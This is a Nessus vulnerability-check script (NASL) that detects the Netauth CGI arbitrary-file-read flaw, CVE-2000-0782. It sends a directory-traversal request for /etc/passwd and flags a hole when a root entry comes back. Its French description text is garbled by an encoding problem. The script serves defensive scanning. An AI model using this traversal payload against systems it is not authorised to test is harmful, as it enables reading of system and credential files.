#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10494);
 script_version ("$Revision: 1.2 $");
 script_bugtraq_id(1587);
 script_cve_id("CVE-2000-0782");

 
 name["english"] = "Netauth";
 name["francais"] = "Netauth";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'Netauth' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : Get the latest version at http://netwinsite.com/netauth/
Risk factor : Serious";


 desc["francais"] = "Le cgi 'Netauth' est install�. Celui-ci poss�de
un probl�me de s�curit� bien connu qui permet � n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privil�ges
de celui-ci (root ou nobody). 

Solution : Mettez-le � jour (http://netwinsite.com/netauth/)
Facteur de risque : S�rieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/netauth.cgi";
 summary["francais"] = "V�rifie la pr�sence de /cgi-bin/netauth.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 data = string(dir,  "/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd");
 data = http_get(item:data, port:port);
 buf = http_keepalive_send_recv(port:port, data:data);
 if( buf == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))security_hole(port);
}
